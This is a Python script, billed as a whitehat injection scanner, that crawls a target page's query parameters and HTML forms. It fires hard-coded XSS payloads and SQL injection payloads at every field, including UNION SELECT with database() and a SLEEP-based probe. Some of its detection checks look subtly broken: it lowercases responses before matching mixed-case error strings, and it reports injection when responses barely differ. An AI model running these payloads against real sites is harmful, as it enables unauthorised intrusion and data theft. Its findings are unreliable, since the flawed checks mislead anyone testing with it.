#!/usr/bin/env python3
"""
Website Injection Tester (Whitehat Hacking Tool)
For AUTHORIZED SECURITY TESTING AND EDUCATIONAL USE ONLY.
DO NOT use on systems you do not have explicit permission to test.
"""

from urllib.parse import urlparse, urlunparse, urlencode, parse_qs, urljoin
import sys


def check_dependencies():
    """Verify required libraries are installed."""
    try:
        import requests
        import bs4
    except ImportError:
        print("\nError: Missing required libraries.")
        print("Please install them using: pip install requests beautifulsoup4")
        sys.exit(1)


check_dependencies()

import requests
from bs4 import BeautifulSoup


def send_request(url, method="GET", data=None):
    """
    Helper function to send HTTP requests.
    """
    try:
        if method.upper() == "POST" and data:
            response = requests.post(url, data=data, timeout=10, allow_redirects=True)
        else:
            response = requests.get(url, params=data, timeout=10, allow_redirects=True)
        return response
    except requests.RequestException as e:
        print(f"  Request Error: {e}")
        return None


def test_xss_payload(url, method, param_name, original_value, payload, is_form_field=False):
    """
    Helper to test a single XSS payload for a given parameter/field.
    """
    print(f"    Trying XSS payload '{payload}' in '{param_name}'...")
    
    if method.upper() == "POST" and is_form_field:
        data = {param_name: payload}
        response = send_request(url, method="POST", data=data)
    else:
        params = {param_name: payload}
        response = send_request(url, method="GET", data=params)
    
    if response is None:
        return False
    
    content = response.text
    
    if payload in content:
        print(f"      !!! POTENTIAL XSS VULNERABILITY DETECTED in '{param_name}' !!!")
        print(f"      Payload '{payload}' was reflected in the page source.")
        return True
    elif payload[:20] in content:
        print(f"      Payload '{payload}' was partially reflected in the page source.")
        print("      (partial reflection) !!!")
        return True
    
    # Check for script tag reflection
    if "<script>" in content and "<script>alert(1)" not in content:
        print("      XSS script tags were reflected. Check for execution.")
        return True
    
    return False


def test_sql_payload(url, method, param_name, original_value, payload, is_form_field=False):
    """
    Helper to test a single SQLi payload for a given parameter/field.
    """
    print(f"    Trying SQLi payload '{payload}' in '{param_name}'...")
    
    if method.upper() == "POST" and is_form_field:
        data = {param_name: payload}
        response = send_request(url, method="POST", data=data)
    else:
        params = {param_name: payload}
        response = send_request(url, method="GET", data=params)
    
    if response is None:
        return False
    
    content = response.text.lower()
    error_indicators = [
        "SQL syntax", "mysql_fetch_array", "odbc_exec", "ORA-",
        "unexpectedly terminated", "quoted string not properly terminated",
        "unclosed quotation mark", "syntax error in query expression"
    ]
    
    for indicator in error_indicators:
        if indicator in content:
            print(f"      !!! POTENTIAL SQL INJECTION VULNERABILITY DETECTED in '{param_name}' !!!")
            print(f"      Database error indicator '{indicator}' found with payload '{payload}'.")
            return True
    
    # Check for boolean-based/blind SQLi
    if "OR 1=1" in payload:
        # Compare response length with original
        if method.upper() == "POST" and is_form_field:
            orig_response = send_request(url, method="POST", data={param_name: original_value})
        else:
            orig_response = send_request(url, method="GET", data={param_name: original_value})
        
        if orig_response:
            diff = abs(len(response.text) - len(orig_response.text))
            if diff < 200:
                print(f"      POSSIBLE SQL INJECTION. Similar page response with payload '{payload}'.")
                return True
    
    return False


def test_injection_on_params(base_url, query_params, method="GET"):
    """
    Tests injection on URL query parameters.
    """
    print(f"  Testing URL parameters for {base_url} (Method: {method})")
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "'><script>alert(1)</script>",
        "%3Csvg/onload=alert(1)%3E",
        '\"-alert(document.domain)-\"'
    ]
    
    sqli_payloads = [
        "' OR 1=1--",
        "' OR '1'='1",
        "' OR 'a'='a",
        "' ORDER BY 1--",
        "' UNION SELECT NULL, NULL--",
        "1; SELECT SLEEP(5)--"
    ]
    
    for param_name, original_value in query_params.items():
        print(f"  -> Parameter: {param_name} (Original value: {original_value})")
        
        # Test XSS payloads
        for payload in xss_payloads:
            test_xss_payload(base_url, method, param_name, original_value, payload, is_form_field=False)
        
        # Test SQLi payloads
        for payload in sqli_payloads:
            test_sql_payload(base_url, method, param_name, original_value, payload, is_form_field=False)
    
    print("  Parameter testing complete.\n")


def find_and_test_forms(target_url):
    """
    Fetches the target URL, parses for forms, and tests their input fields.
    """
    print(f"\n--- Discovering and Testing Forms for: {target_url} ---")
    
    response = send_request(target_url, method="GET")
    if response is None:
        print("  Failed to fetch target URL to find forms.")
        return
    
    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")
    
    if not forms:
        print("  No HTML forms found on the page.")
        return
    
    print(f"  Found {len(forms)} form(s).\n")
    
    xss_payloads = [
        "<script>alert('XSS-Form')</script>",
        "'><img src=x onerror=alert(1)>",
        "<body onload=alert('XSS-Body')>"
    ]
    
    sqli_payloads = [
        "admin'--",
        "' OR 1=1#",
        "' UNION SELECT 1,database(),3--",
        "' and 0 union select null,null,null,null,null --"
    ]
    
    for form_index, form in enumerate(forms, start=1):
        print(f"  --- Testing Form #{form_index} ---")
        action = form.get("action", "")
        form_method = form.get("method", "get").lower()
        print(f"  Form Action: {action}, Method: {form_method}")
        
        input_fields = form.find_all(["input", "textarea", "select"])
        injectable_fields = []
        
        for field in input_fields:
            field_name = field.get("name")
            if not field_name:
                continue
            field_type = field.get("type", "text").lower()
            if field_type in ("submit", "button", "hidden", "radio", "checkbox"):
                continue
            injectable_fields.append(field_name)
            field_value = field.get("value", "")
            print(f"    Identified form field: {field_name} (Type: {field_type})")
        
        if not injectable_fields:
            print("      No injectable input fields found in this form. Skipping.")
            continue
        
        form_url = urljoin(target_url, action) if action else target_url
        
        for field_name in injectable_fields:
            print(f"    -> Field: {field_name}")
            
            for payload in xss_payloads:
                test_xss_payload(form_url, form_method, field_name, "", payload, is_form_field=True)
            
            for payload in sqli_payloads:
                test_sql_payload(form_url, form_method, field_name, "", payload, is_form_field=True)
        
        print("  Form testing complete.\n")


if __name__ == "__main__":
    print("----------------------------------------------------------")
    print("  Website Injection Tester (Whitehat Hacking Tool)        ")
    print("  For AUTHORIZED SECURITY TESTING AND EDUCATIONAL USE ONLY.")
    print("  DO NOT use on systems you do not have explicit permission")
    print("  to test. Misuse can lead to severe legal consequences.   ")
    print("----------------------------------------------------------")
    
    if len(sys.argv) < 2 or not sys.argv[1].strip():
        print("URL cannot be empty. Exiting.")
        sys.exit(1)
    
    target_url = sys.argv[1].strip()
    parsed_url = urlparse(target_url)
    query = parsed_url.query
    query_params = parse_qs(query)
    
    if query_params:
        test_injection_on_params(target_url, query_params)
    else:
        print("No initial URL query parameters found. Skipping direct parameter injection tests.")
    
    find_and_test_forms(target_url)
    
    print("\nInjection testing complete. Remember to analyze the full HTTP responses and application behavior for definitive results.")
    print("This script provides basic indicators; real-world testing requires more advanced techniques and manual verification.")
